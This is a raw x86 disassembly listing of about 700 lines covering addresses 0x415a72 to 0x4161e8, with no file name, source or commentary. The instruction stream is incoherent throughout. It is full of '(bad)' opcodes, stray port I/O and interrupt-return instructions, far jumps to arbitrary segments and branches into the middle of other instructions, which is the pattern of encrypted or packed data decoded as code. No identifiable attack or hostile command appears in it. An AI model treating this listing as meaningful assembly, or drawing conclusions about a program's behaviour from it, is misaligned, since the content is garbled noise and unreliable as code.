  415a72:	mov    dl,0xec
  415a74:	shl    DWORD PTR [eax],1
  415a76:	mov    ebp,0x7e1d7247
  415a7b:	cmp    edi,edx
  415a7d:	mov    ebp,eax
  415a7f:	test   eax,0x34ed9a4d
  415a84:	jno    0x415a95
  415a86:	ds xchg ebx,eax
  415a88:	in     al,0xe4
  415a8a:	pop    esp
  415a8b:	in     eax,dx
  415a8c:	dec    ebx
  415a8d:	jmp    0x415acb
  415a8f:	test   DWORD PTR [esi+0x6eca18ed],ecx
  415a95:	sahf   
  415a96:	inc    ebx
  415a97:	iret   
  415a98:	retf   
  415a99:	dec    esi
  415a9a:	mov    eax,0x5155d195
  415a9f:	mov    bh,0x10
  415aa1:	cmp    dh,BYTE PTR [edx-0x56]
  415aa4:	and    ecx,ebx
  415aa6:	adc    DWORD PTR [esi+0x4783e308],0x70a5ce08
  415ab0:	out    dx,eax
  415ab1:	inc    edx
  415ab2:	loopne 0x415a6e
  415ab4:	cmc    
  415ab5:	pop    es
  415ab6:	xor    BYTE PTR [esi],bl
  415ab8:	push   eax
  415ab9:	push   ebx
  415aba:	out    dx,eax
  415abb:	test   DWORD PTR [edx+0x42],edx
  415abe:	ins    DWORD PTR es:[edi],dx
  415abf:	retf   
  415ac0:	stos   BYTE PTR es:[edi],al
  415ac1:	ror    BYTE PTR [ebx+0x2d],0xc2
  415ac5:	add    eax,0xf846232c
  415aca:	fmul   DWORD PTR ds:0xc3402efe
  415ad0:	sub    al,0x1b
  415ad2:	rol    BYTE PTR [edi+0x2d],1
  415ad5:	call   ecx
  415ad7:	out    0xd8,eax
  415ad9:	sub    bh,BYTE PTR [esi+0x30f4b0f]
  415adf:	leave  
  415ae0:	mov    ebx,0xec82bfbe
  415ae5:	es (bad) 
  415ae7:	(bad)  
  415ae8:	sub    eax,0x380fd95b
  415aed:	aas    
  415aee:	popa   
  415aef:	inc    ecx
  415af0:	imul   DWORD PTR [eax]
  415af2:	sub    edx,DWORD PTR [edi+0x193f23cb]
  415af8:	loope  0x415b2b
  415afa:	mov    edx,ebx
  415afc:	cmp    al,0xa6
  415afe:	cmp    al,0x6b
  415b00:	lea    ebp,[ebx-0x3daae959]
  415b06:	inc    edi
  415b07:	loop   0x415b2e
  415b09:	fld    TBYTE PTR [ecx-0x18602197]
  415b0f:	ds ss in eax,0x2
  415b13:	jns    0x415ada
  415b15:	ins    DWORD PTR es:[edi],dx
  415b16:	sub    dl,BYTE PTR [eax+eiz*1+0x5]
  415b1a:	in     eax,dx
  415b1b:	retf   0x34ae
  415b1e:	xor    DWORD PTR [esi+0x29bf9f7f],edx
  415b24:	clc    
  415b25:	sbb    BYTE PTR [ebx],0x20
  415b28:	sub    BYTE PTR [esi+0x27],al
  415b2b:	call   0x89598b6f
  415b30:	adc    DWORD PTR [eax],ecx
  415b32:	mov    ch,0xcb
  415b34:	dec    edx
  415b35:	(bad)  
  415b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b37:	sbb    edi,DWORD PTR [ecx-0x3bef91b6]
  415b3d:	and    cl,BYTE PTR [ebx+0x33649902]
  415b43:	inc    ebx
  415b44:	stc    
  415b45:	mov    dl,BYTE PTR [edi+ecx*4+0x4172fee]
  415b4c:	adc    DWORD PTR [edx+0xc],esi
  415b4f:	(bad)  
  415b50:	push   esp
  415b51:	mov    ds:0xcf264f5,eax
  415b56:	out    0x72,eax
  415b58:	jne    0x415b27
  415b5a:	lds    eax,FWORD PTR fs:[edx-0x6a7424bd]
  415b61:	idiv   BYTE PTR [di-0x56]
  415b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b66:	test   eax,0x1acdb075
  415b6b:	xlat   BYTE PTR ds:[ebx]
  415b6c:	or     ebx,edi
  415b6e:	enter  0xe11d,0xc7
  415b72:	fsub   QWORD PTR [esi+ebp*2+0x31]
  415b76:	push   esp
  415b77:	pop    esp
  415b78:	(bad)  
  415b79:	mov    bh,0x3d
  415b7b:	push   0x43af8a4f
  415b80:	sub    ah,BYTE PTR [edx]
  415b82:	push   0x29e35214
  415b87:	and    ch,BYTE PTR [ebp-0x51cbddbc]
  415b8d:	lods   eax,DWORD PTR ds:[esi]
  415b8e:	jecxz  0x415b79
  415b90:	sti    
  415b91:	pop    edx
  415b92:	and    DWORD PTR [eax-0x77b2f889],0x4490f1e7
  415b9c:	sub    WORD PTR [eax-0x51],ax
  415ba0:	pop    edi
  415ba1:	xor    BYTE PTR [ecx+edi*2-0x58448489],ah
  415ba8:	mov    edx,0x45b4dcbe
  415bad:	fisubr DWORD PTR [esi+0xd]
  415bb0:	leave  
  415bb1:	sub    ebp,DWORD PTR [ebx]
  415bb3:	std    
  415bb4:	ret    
  415bb5:	cmc    
  415bb6:	lahf   
  415bb7:	ins    DWORD PTR es:[edi],dx
  415bb8:	pop    ds
  415bb9:	mov    ebx,0xca8506bb
  415bbe:	ror    dl,cl
  415bc0:	push   ebx
  415bc1:	xor    BYTE PTR [ecx+0x46],bl
  415bc4:	xchg   edi,eax
  415bc5:	aam    0x55
  415bc7:	xchg   esi,eax
  415bc8:	(bad)  
  415bc9:	mov    ecx,0xf1d8d1f6
  415bce:	inc    esp
  415bcf:	out    dx,eax
  415bd0:	push   0xadbc3be7
  415bd5:	adc    al,0x85
  415bd7:	pop    ecx
  415bd8:	pop    eax
  415bd9:	jne    0x415c22
  415bdb:	leave  
  415bdc:	and    edi,DWORD PTR [esi+0x23648e6f]
  415be2:	or     dh,dh
  415be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415be5:	mov    eax,ds:0x5e3cb6bb
  415bea:	les    esp,FWORD PTR [esp+ecx*1]
  415bed:	cli    
  415bee:	lods   eax,DWORD PTR ds:[esi]
  415bef:	inc    edi
  415bf0:	adc    ecx,ecx
  415bf2:	int3   
  415bf3:	xlat   BYTE PTR ds:[ebx]
  415bf4:	ins    BYTE PTR es:[edi],dx
  415bf5:	inc    esp
  415bf6:	sub    eax,0x82b735fe
  415bfb:	jge    0x415c0b
  415bfd:	sub    BYTE PTR [eax],ch
  415bff:	inc    edi
  415c00:	popa   
  415c01:	ins    BYTE PTR es:[edi],dx
  415c02:	dec    ebx
  415c03:	(bad)  [ebx+ebp*2-0x281fb20d]
  415c0a:	retf   
  415c0b:	in     eax,0xfd
  415c0d:	add    al,0xb5
  415c0f:	push   0x59f24982
  415c14:	cmp    bl,BYTE PTR [ebp-0x17ec89f]
  415c1a:	or     DWORD PTR [ebx],edx
  415c1c:	stc    
  415c1d:	and    BYTE PTR [edx+ecx*2-0x15],dl
  415c21:	(bad)  
  415c22:	inc    ch
  415c24:	adc    eax,0x4138a611
  415c29:	dec    ebx
  415c2a:	sub    DWORD PTR [esi],ebx
  415c2c:	or     edi,0xb476201d
  415c32:	ret    
  415c33:	(bad)  
  415c34:	or     al,0xf3
  415c36:	dec    esi
  415c37:	ret    
  415c38:	or     ecx,DWORD PTR [eax]
  415c3a:	loopne 0x415c57
  415c3c:	or     eax,0x6b0673d1
  415c41:	mov    ch,0xf8
  415c43:	jl     0x415c9f
  415c45:	shr    DWORD PTR gs:[edx+0x13b5311e],0xff
  415c4d:	imul   ecx,DWORD PTR ss:[esi],0xffffffed
  415c51:	inc    eax
  415c52:	mov    ds:0x4e222f0a,al
  415c57:	leave  
  415c58:	or     cl,BYTE PTR [edi+0x3e]
  415c5b:	mov    ss,WORD PTR [esi]
  415c5d:	ds dec edx
  415c5f:	dec    esp
  415c60:	in     eax,0xba
  415c62:	enter  0x8ae4,0xd1
  415c66:	jae    0x415bef
  415c68:	out    dx,eax
  415c69:	(bad)  
  415c6b:	(bad)  
  415c6c:	stc    
  415c6d:	inc    ebp
  415c6e:	sahf   
  415c6f:	jecxz  0x415c97
  415c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c72:	pop    ds
  415c73:	lods   al,BYTE PTR ds:[esi]
  415c74:	xchg   edx,eax
  415c75:	mov    esp,0x47638b21
  415c7a:	mov    bl,0x39
  415c7c:	mov    edx,0x5c0e0f30
  415c81:	push   bx
  415c83:	add    eax,DWORD PTR [esi+ebp*4-0x799e6cef]
  415c8a:	in     eax,0xb8
  415c8c:	xor    ah,al
  415c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c8f:	leave  
  415c90:	mov    ebp,0x5ad9edf
  415c95:	inc    edi
  415c96:	lahf   
  415c97:	mov    bl,0xb
  415c99:	stc    
  415c9a:	inc    edx
  415c9b:	je     0x415cc6
  415c9d:	xchg   edi,eax
  415c9e:	mov    bh,0xff
  415ca0:	sub    cl,BYTE PTR [edx+0x6c]
  415ca3:	pop    ds
  415ca4:	fcomp  DWORD PTR [edi]
  415ca6:	xor    BYTE PTR ds:0xc8581f15,ah
  415cac:	call   0xf4cbdfc5
  415cb1:	pop    ecx
  415cb2:	sub    BYTE PTR [ebx+0x7b],ah
  415cb5:	xchg   BYTE PTR [edx-0x677193cc],ch
  415cbb:	pop    ss
  415cbc:	jg     0x415d29
  415cbe:	sti    
  415cbf:	pop    edx
  415cc0:	mov    esp,0xa5de4cb3
  415cc5:	jp     0x415cd9
  415cc7:	repz fist DWORD PTR [di]
  415ccb:	clc    
  415ccc:	mov    ecx,0x6e67c3af
  415cd1:	fmul   st(5),st
  415cd3:	lods   al,BYTE PTR ds:[esi]
  415cd4:	scas   eax,DWORD PTR es:[edi]
  415cd5:	add    al,BYTE PTR [edx]
  415cd7:	xchg   esi,eax
  415cd8:	xchg   ebx,eax
  415cd9:	pop    ecx
  415cda:	mov    al,ds:0x653854ee
  415cdf:	mov    al,ds:0x310411bf
  415ce4:	retf   
  415ce5:	rol    DWORD PTR [ebx-0x2c],cl
  415ce8:	mov    es,WORD PTR [ecx+ebx*8+0x597ef0]
  415cef:	ds dec ebx
  415cf1:	popa   
  415cf2:	jbe    0x415d0e
  415cf4:	mov    dh,0x87
  415cf6:	xchg   esi,eax
  415cf7:	cmp    eax,0x5f065a31
  415cfc:	push   ebx
  415cfd:	(bad)  
  415cfe:	mov    esi,0xffd0de66
  415d03:	mov    ch,0x42
  415d05:	sbb    DWORD PTR [ebx],ecx
  415d07:	mov    bl,0x57
  415d09:	lods   eax,DWORD PTR ds:[esi]
  415d0a:	out    dx,al
  415d0b:	(bad)  [edx+0x2c]
  415d0e:	sbb    eax,0x73697ac
  415d13:	push   edi
  415d14:	mov    ds:0xd527a794,eax
  415d19:	pushf  
  415d1a:	inc    ebx
  415d1b:	lahf   
  415d1c:	arpl   WORD PTR [edi],sp
  415d1e:	pop    ebp
  415d1f:	mov    eax,DWORD PTR [esi]
  415d21:	sar    DWORD PTR [ebx-0x4b955aae],1
  415d27:	int3   
  415d28:	cmp    edx,DWORD PTR [edx-0x1ec0c64d]
  415d2e:	pop    esp
  415d2f:	push   0xffffffb6
  415d31:	stos   BYTE PTR es:[edi],al
  415d32:	fucom  st(4)
  415d34:	test   ecx,edi
  415d36:	jno    0x415db2
  415d38:	daa    
  415d39:	cdq    
  415d3a:	or     al,0xe
  415d3c:	jp     0x415cc4
  415d3e:	jp     0x415d0a
  415d40:	fstp   st(2)
  415d42:	add    al,0x23
  415d44:	mov    esp,0xed2d86c7
  415d49:	div    BYTE PTR [ebp-0x78d0a05c]
  415d4f:	xchg   ebp,eax
  415d50:	pop    ebp
  415d51:	push   edx
  415d52:	or     BYTE PTR [esi+0xcb122eb],ch
  415d58:	or     ecx,DWORD PTR ds:0xb934742e
  415d5e:	nop
  415d5f:	mov    ebp,0x66125ef1
  415d64:	pop    esp
  415d65:	xchg   ebp,eax
  415d66:	shl    BYTE PTR [edi+ebx*4],0xbb
  415d6a:	or     eax,0xbad8d640
  415d6f:	sbb    ebp,DWORD PTR [edi-0x337ae07]
  415d75:	lds    ebx,FWORD PTR [ebx+0x5958ac29]
  415d7b:	mov    ch,0x9
  415d7d:	xchg   esi,eax
  415d7e:	and    ch,BYTE PTR [ebp+0x20]
  415d81:	(bad)  
  415d82:	js     0x415d84
  415d84:	jmp    0xdca32d30
  415d89:	adc    DWORD PTR [ebx-0x45],0x7a
  415d8d:	jmp    0x25aa:0x147b63b5
  415d94:	lods   eax,DWORD PTR ds:[esi]
  415d95:	addr16 dec eax
  415d97:	or     eax,0x26cf4893
  415d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d9d:	adc    eax,0xc3320f81
  415da2:	pushf  
  415da3:	ins    DWORD PTR es:[di],dx
  415da5:	sbb    al,0xf1
  415da7:	pop    DWORD PTR [eax-0x20]
  415daa:	sti    
  415dab:	sub    al,0xe7
  415dad:	aam    0xd0
  415daf:	ror    BYTE PTR [edi+eax*2-0x63],0x8f
  415db4:	imul   ecx,DWORD PTR [esi+0x44],0x6a
  415db8:	mov    ch,0x72
  415dba:	popf   
  415dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dbc:	out    0x13,eax
  415dbe:	mov    ds:0x4e8ed013,al
  415dc3:	mov    eax,ds:0x4309e6ce
  415dc8:	fwait
  415dc9:	sbb    esp,DWORD PTR [ebx+eax*1-0x5d]
  415dcd:	not    BYTE PTR [esi+ebx*2]
  415dd0:	fisub  DWORD PTR [edx]
  415dd2:	jo     0x415d6d
  415dd4:	rcr    DWORD PTR [edi],cl
  415dd6:	jns    0x415e55
  415dd8:	jg     0x415e50
  415dda:	rol    BYTE PTR [eax-0x70],cl
  415ddd:	mov    ah,BYTE PTR [eax]
  415ddf:	pop    ebp
  415de0:	mov    ebp,0x36f596a
  415de5:	jp     0x415d97
  415de7:	sbb    BYTE PTR [edx+0x2de4018c],cl
  415ded:	cld    
  415dee:	gs stos DWORD PTR es:[edi],eax
  415df0:	ins    BYTE PTR es:[edi],dx
  415df1:	add    edi,esp
  415df3:	inc    edx
  415df4:	sti    
  415df5:	gs pop ss
  415df7:	sub    eax,0xd28e4e40
  415dfc:	mov    edx,0x8ce76f2e
  415e01:	test   BYTE PTR [esi+ebx*8-0x42],0x3c
  415e06:	adc    eax,0x3e9715d4
  415e0b:	sahf   
  415e0c:	cld    
  415e0d:	dec    edi
  415e0e:	jl     0x415e4d
  415e10:	mov    ebx,0x5d7a1134
  415e15:	cmp    eax,0x4b262f73
  415e1a:	and    al,0xf9
  415e1c:	jns    0x415e0c
  415e1e:	dec    esi
  415e1f:	retf   0xc3ac
  415e22:	dec    edx
  415e23:	sti    
  415e24:	(bad)
  415e27:	push   edi
  415e28:	cmp    DWORD PTR [ecx],ebx
  415e2a:	sub    DWORD PTR [edi+0x3a361303],ebp
  415e30:	adc    al,BYTE PTR [edx]
  415e32:	add    al,0x63
  415e34:	into   
  415e35:	retf   
  415e36:	push   0xffffffdb
  415e38:	xchg   DWORD PTR [ecx-0x202561a0],ebp
  415e3e:	lods   al,BYTE PTR ds:[esi]
  415e3f:	adc    eax,0xdc015ed9
  415e44:	mov    bh,0x2c
  415e46:	idiv   DWORD PTR [ebx*8+0x76e735dc]
  415e4d:	push   esi
  415e4e:	rcl    BYTE PTR [esp-0x6ae7d739],0xd5
  415e56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e57:	sub    ecx,DWORD PTR ds:0x16060cf3
  415e5d:	les    esi,FWORD PTR [edx-0x528c35cb]
  415e63:	sbb    al,0x74
  415e65:	scas   al,BYTE PTR es:[edi]
  415e66:	pop    eax
  415e67:	or     BYTE PTR [ebx-0x1832be6a],0xdf
  415e6e:	pop    edi
  415e6f:	leave  
  415e70:	cmp    al,0x55
  415e72:	popa   
  415e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e74:	push   0xffffffb7
  415e76:	xchg   ebx,eax
  415e77:	xor    eax,DWORD PTR [ecx-0x370af78]
  415e7d:	dec    edx
  415e7e:	push   cs
  415e7f:	mov    cs,WORD PTR [esi]
  415e81:	in     eax,0x6e
  415e83:	(bad)  
  415e84:	sar    BYTE PTR [eax-0x4d],0x16
  415e88:	ja     0x415f08
  415e8a:	sub    DWORD PTR [eax],esp
  415e8c:	fcmovnu st,st(0)
  415e8e:	cs jp  0x415eb8
  415e91:	or     al,0x5
  415e93:	loope  0x415ede
  415e95:	jmp    0x936e:0xf1377487
  415e9c:	dec    eax
  415e9d:	jp     0x415ed6
  415e9f:	adc    BYTE PTR [esi],al
  415ea1:	arpl   dx,si
  415ea3:	xor    dl,BYTE PTR [ebp-0x1a]
  415ea6:	sbb    bh,ch
  415ea8:	fisttp WORD PTR [ebp+0x69]
  415eab:	sbb    ebx,DWORD PTR [ecx+0x6f3091ae]
  415eb1:	jl     0x415f08
  415eb3:	xchg   esp,eax
  415eb4:	jb     0x415f29
  415eb6:	aaa    
  415eb7:	scas   eax,DWORD PTR es:[edi]
  415eb8:	mov    al,0x75
  415eba:	mov    cs,eax
  415ebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ebe:	xor    al,0x27
  415ec0:	out    0x4c,eax
  415ec2:	sbb    DWORD PTR ds:0x98406cbd,edx
  415ec8:	mov    WORD PTR [ecx+0x4e],ds
  415ecb:	dec    ebp
  415ecc:	scas   al,BYTE PTR es:[edi]
  415ecd:	inc    ecx
  415ece:	ret    
  415ecf:	and    cl,BYTE PTR [esi-0x64]
  415ed2:	and    al,0x68
  415ed4:	xchg   esp,eax
  415ed5:	push   edi
  415ed6:	xor    al,BYTE PTR ds:0x71ef2d64
  415edc:	dec    ebx
  415edd:	shl    eax,1
  415edf:	mov    esi,DWORD PTR [esi]
  415ee1:	sub    eax,0xb0c2bc3a
  415ee6:	loope  0x415f50
  415ee8:	in     al,dx
  415ee9:	popa   
  415eea:	mov    esi,0xd1a8c380
  415eef:	stc    
  415ef0:	mov    eax,0xb7890e20
  415ef6:	pop    es
  415ef7:	mov    bh,0xec
  415ef9:	adc    BYTE PTR [ebp+0xa],bh
  415efc:	call   0x8c2e:0x4ba87bef
  415f03:	jecxz  0x415f14
  415f05:	mov    ah,0x3f
  415f07:	adc    ebx,DWORD PTR [ebx-0xc1d2236]
  415f0d:	add    cl,BYTE PTR [ebp-0x729e6d07]
  415f13:	in     eax,dx
  415f14:	cmp    BYTE PTR [ecx-0x4260c0f5],cl
  415f1a:	inc    esi
  415f1b:	shl    DWORD PTR [ecx+edx*4-0x24a3671f],0x49
  415f23:	jno    0x415f1f
  415f25:	inc    esi
  415f26:	pusha  
  415f27:	xchg   esp,eax
  415f28:	adc    ecx,ecx
  415f2a:	movq   QWORD PTR [eax+0x51c60312],mm7
  415f31:	rdpmc  
  415f33:	or     DWORD PTR [ebx],esi
  415f35:	and    ebx,eax
  415f37:	out    dx,al
  415f38:	dec    edx
  415f39:	lock mov DWORD PTR fs:[bx+di-0x37],esi
  415f3f:	adc    dh,ch
  415f41:	in     eax,0xf5
  415f43:	call   0xa81c1298
  415f48:	out    dx,al
  415f49:	pop    ecx
  415f4a:	cmp    BYTE PTR [eax+0x19],bh
  415f4d:	daa    
  415f4e:	mov    bh,0x68
  415f50:	scas   eax,DWORD PTR es:[edi]
  415f51:	in     eax,dx
  415f52:	push   es
  415f53:	mov    bl,0xc5
  415f55:	xchg   ecx,eax
  415f56:	inc    eax
  415f57:	or     al,0xe2
  415f59:	jmp    0x415f83
  415f5b:	xor    al,0xc9
  415f5d:	dec    DWORD PTR [edx]
  415f5f:	xchg   ecx,eax
  415f60:	mov    ds:0x6e8cffd7,eax
  415f65:	jg     0x415fb7
  415f67:	psubb  mm2,QWORD PTR [eax-0x46]
  415f6b:	aas    
  415f6c:	cmp    BYTE PTR [esi+0x7e],bh
  415f6f:	xchg   esi,eax
  415f70:	xor    eax,0x26004090
  415f75:	pop    ecx
  415f76:	data16 mov dh,0xb7
  415f79:	int    0xf4
  415f7b:	and    ecx,DWORD PTR [edi]
  415f7d:	cdq    
  415f7e:	mov    dl,0xa4
  415f80:	int    0xac
  415f82:	add    al,0x34
  415f84:	push   ebx
  415f85:	dec    ecx
  415f86:	push   0xf79047ad
  415f8b:	xor    eax,0xd5f94efb
  415f90:	outs   dx,DWORD PTR ds:[esi]
  415f91:	mov    ds:0x7b355254,al
  415f96:	add    ah,BYTE PTR [ecx]
  415f98:	mov    bh,0x4f
  415f9a:	push   ebx
  415f9b:	inc    ebx
  415f9c:	js     0x415f4b
  415f9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f9f:	jae    0x415f23
  415fa1:	pop    edx
  415fa2:	es mov bl,0x9f
  415fa5:	arpl   bp,si
  415fa7:	xor    DWORD PTR [eax+ebx*4],esi
  415faa:	jle    0x415fcb
  415fac:	in     eax,0xa7
  415fae:	jns    0x41602d
  415fb0:	adc    DWORD PTR [edi+0x71],0xffffffe1
  415fb4:	cmp    edi,DWORD PTR [ebx+0x2c]
  415fb7:	jne    0x415fdd
  415fb9:	inc    ebp
  415fba:	adc    DWORD PTR [edx-0x4d],ecx
  415fbd:	ret    
  415fbe:	repz imul edx,edi,0x8a9ff031
  415fc5:	add    BYTE PTR [esi],al
  415fc7:	and    al,0x2c
  415fc9:	mov    bl,0xec
  415fcb:	mov    ebp,0x2333fac5
  415fd0:	inc    edx
  415fd1:	(bad)  
  415fd2:	xchg   ebp,eax
  415fd3:	ror    DWORD PTR [ebx-0x188517fb],cl
  415fd9:	les    esp,FWORD PTR [edx+edx*2-0x6c712e40]
  415fe0:	jg     0x416055
  415fe2:	aad    0xb0
  415fe4:	jns    0x41603a
  415fe6:	xor    ah,ch
  415fe8:	xchg   ebp,eax
  415fe9:	adc    ebp,edx
  415feb:	jp     0x416004
  415fed:	in     eax,dx
  415fee:	cmc    
  415fef:	stos   BYTE PTR es:[edi],al
  415ff0:	imul   ebx,DWORD PTR [esi],0x44
  415ff3:	mov    eax,DWORD PTR [ebx+0x48bbbb9a]
  415ff9:	pop    ebp
  415ffa:	sti    
  415ffb:	pop    ebp
  415ffc:	mov    eax,ds:0x36a97444
  416001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416002:	mov    al,ds:0xf3408ca0
  416007:	(bad)  
  416008:	fbstp  TBYTE PTR [ebx]
  41600a:	inc    esi
  41600b:	fimul  DWORD PTR [eax-0x55abd435]
  416011:	inc    ecx
  416012:	fcomip st,st(3)
  416014:	aad    0xad
  416016:	xchg   ebp,eax
  416017:	add    dl,0x1
  41601a:	add    al,0xb1
  41601c:	jecxz  0x415fc6
  41601e:	pop    ss
  41601f:	inc    ebp
  416020:	mov    ebx,0xc03e9313
  416025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416026:	cdq    
  416027:	jno    0x416085
  416029:	pusha  
  41602a:	jg     0x415fe5
  41602c:	push   ds
  41602d:	jno    0x416027
  41602f:	stos   DWORD PTR es:[edi],eax
  416030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416031:	outs   dx,BYTE PTR ds:[esi]
  416032:	inc    edx
  416033:	aaa    
  416034:	mov    edx,0x1f7c1f76
  416039:	aad    0x83
  41603b:	cmp    dh,BYTE PTR [ecx]
  41603d:	mov    DWORD PTR [ebx-0x77],ecx
  416040:	rol    DWORD PTR [eax+0x36],0xad
  416044:	xchg   ebx,eax
  416045:	push   es
  416046:	mov    eax,0x7ce8b622
  41604b:	popa   
  41604c:	mov    dh,0xf6
  41604e:	push   cs
  41604f:	in     al,dx
  416050:	mov    ecx,0x9007a11e
  416055:	fnstsw WORD PTR [edx]
  416057:	pop    ds
  416058:	arpl   WORD PTR [eax-0x26cf733c],bx
  41605e:	arpl   WORD PTR [ebp+0x34],dx
  416061:	lahf   
  416062:	loopne 0x41601b
  416064:	pop    DWORD PTR [ebx+0xc2fb933]
  41606a:	pop    ds
  41606b:	mov    ebp,0xa6166e76
  416070:	test   DWORD PTR [edx],ebp
  416072:	push   ebx
  416073:	int3   
  416074:	icebp  
  416075:	aaa    
  416076:	mov    edx,0xf9995c3c
  41607b:	mov    esp,0x6026f6c5
  416080:	sbb    eax,0xfe64aab9
  416085:	jmp    0x550f8e79
  41608a:	sbb    ebx,DWORD PTR [eax+edi*8+0x10479d9]
  416091:	retf   
  416092:	jae    0x4160b5
  416094:	clc    
  416095:	jle    0x4160d6
  416097:	adc    eax,0x5e119452
  41609c:	pop    ebx
  41609d:	adc    ebx,ebp
  41609f:	(bad)  
  4160a0:	scas   eax,DWORD PTR es:[edi]
  4160a1:	(bad)  
  4160a3:	jnp    0x4160e8
  4160a5:	jbe    0x4160f8
  4160a7:	xor    eax,0x9e0faa22
  4160ac:	inc    eax
  4160ad:	push   0x41
  4160af:	inc    ebp
  4160b0:	gs out dx,al
  4160b2:	cli    
  4160b3:	pop    esi
  4160b4:	mov    ds:0xb1ebb40,eax
  4160b9:	xor    al,0x13
  4160bb:	xchg   BYTE PTR [edx+0x23],al
  4160be:	test   BYTE PTR [ecx-0xdc2147d],cl
  4160c4:	scas   al,BYTE PTR es:[edi]
  4160c5:	aaa    
  4160c6:	cmc    
  4160c7:	out    0x58,al
  4160c9:	jbe    0x416050
  4160cb:	leave  
  4160cc:	cwde   
  4160cd:	xchg   ebp,eax
  4160ce:	cmp    al,0xfe
  4160d0:	lods   eax,DWORD PTR ds:[esi]
  4160d1:	jmp    DWORD PTR [ebx]
  4160d3:	pop    ebx
  4160d4:	and    eax,0xca267e04
  4160d9:	pop    esi
  4160da:	cmp    BYTE PTR [ebp+0x34],bh
  4160dd:	outs   dx,BYTE PTR ds:[esi]
  4160de:	jno    0x41611a
  4160e0:	xchg   BYTE PTR cs:[edx-0x68],ah
  4160e4:	fnstcw WORD PTR [edi]
  4160e6:	pop    esp
  4160e7:	fdiv   DWORD PTR [ebx+0x14]
  4160ea:	fsubr  DWORD PTR [edi]
  4160ec:	gs jns 0x41615a
  4160ef:	pop    edx
  4160f0:	xchg   ecx,eax
  4160f1:	cmp    bh,BYTE PTR [ecx]
  4160f3:	sub    esp,0xffffffd2
  4160f6:	push   esp
  4160f7:	dec    esp
  4160f8:	and    esi,ecx
  4160fa:	(bad)  
  4160fb:	aad    0x66
  4160fd:	xor    BYTE PTR [eax+0x32c9a25d],ch
  416103:	stc    
  416104:	inc    edx
  416105:	sbb    ebp,ebp
  416107:	xor    al,0xd7
  416109:	jno    0x4160c9
  41610b:	add    eax,0x78d86c07
  416110:	xor    al,0xd8
  416112:	mov    ch,0xe6
  416114:	in     eax,dx
  416115:	bound  edi,QWORD PTR [ecx+0x6345d886]
  41611b:	cli    
  41611c:	or     ch,BYTE PTR [ecx-0x2fee5d43]
  416122:	mov    ah,0xf2
  416124:	mov    ch,0x4b
  416126:	xchg   DWORD PTR [edi-0x73],eax
  416129:	xlat   BYTE PTR ds:[ebx]
  41612a:	add    edx,DWORD PTR [edi]
  41612c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41612d:	(bad)  
  41612e:	(bad)  
  41612f:	fmulp  st(5),st
  416131:	test   al,0x4f
  416133:	mov    ?,WORD PTR [edx+0x29e9f369]
  416139:	into   
  41613a:	xchg   ecx,eax
  41613b:	add    eax,DWORD PTR [esp+ebx*4]
  41613e:	and    cl,BYTE PTR [esi]
  416140:	sub    bl,bh
  416142:	fs hlt 
  416144:	fmul   QWORD PTR [eax-0x1f1b4113]
  41614a:	xor    al,0x21
  41614c:	call   0x8a6d916b
  416151:	sub    ebx,DWORD PTR [ebp+edi*1+0x12]
  416155:	nop
  416156:	gs sahf 
  416158:	jno    0x4161d5
  41615a:	scas   al,BYTE PTR es:[edi]
  41615b:	jecxz  0x4160de
  41615d:	mov    fs,ebp
  41615f:	inc    esp
  416160:	mov    bl,0x34
  416162:	icebp  
  416163:	in     al,dx
  416164:	retf   0xfde4
  416167:	cmp    al,al
  416169:	push   esi
  41616a:	ds add edi,ecx
  41616d:	aam    0xd7
  41616f:	or     eax,0x400baa02
  416174:	outs   dx,DWORD PTR ds:[esi]
  416175:	loopne 0x4161b5
  416177:	xchg   edi,eax
  416178:	add    al,0xbc
  41617a:	mov    bh,0xdf
  41617c:	jnp    0x4161df
  41617e:	int3   
  41617f:	jo     0x4161cf
  416181:	add    al,0x4
  416183:	cmp    BYTE PTR [ebx],bh
  416185:	jnp    0x4161f4
  416187:	icebp  
  416188:	mov    bl,0x8
  41618a:	mov    ?,WORD PTR [esi+0x2f2c47d2]
  416190:	sub    BYTE PTR [eax-0x2a79a024],bh
  416196:	pop    edx
  416197:	and    edi,DWORD PTR [esi+0x14]
  41619a:	stos   BYTE PTR es:[edi],al
  41619b:	out    dx,eax
  41619c:	(bad)  
  41619d:	outs   dx,BYTE PTR ds:[esi]
  41619e:	sbb    edx,DWORD PTR [ebp-0x19]
  4161a1:	loop   0x416203
  4161a3:	mov    ecx,0xd8667516
  4161a8:	out    0xc2,eax
  4161aa:	int    0x6c
  4161ac:	lahf   
  4161ad:	je     0x41619f
  4161af:	inc    ebx
  4161b0:	inc    ebp
  4161b1:	pop    esi
  4161b2:	loope  0x416197
  4161b4:	xchg   DWORD PTR ds:0xfb313dfd,edx
  4161ba:	mov    ah,0xcf
  4161bc:	jno    0x416156
  4161be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161bf:	push   edi
  4161c0:	or     BYTE PTR [ebx+0x2f],bh
  4161c3:	ffreep st(0)
  4161c5:	add    al,0x79
  4161c7:	in     eax,dx
  4161c8:	xor    al,0xe0
  4161ca:	pop    edx
  4161cb:	(bad)  
  4161cc:	fst    DWORD PTR [ecx+0xd186aeb]
  4161d2:	iret   
  4161d3:	repz or eax,0xc36d1cd8
  4161d9:	int    0x14
  4161db:	sbb    DWORD PTR [edi+0x74],0x67
  4161df:	aaa    
  4161e0:	adc    eax,0x7fbbf5d4
  4161e5:	mov    al,0x80
  4161e7:	dec    esp
  4161e8:	popa   
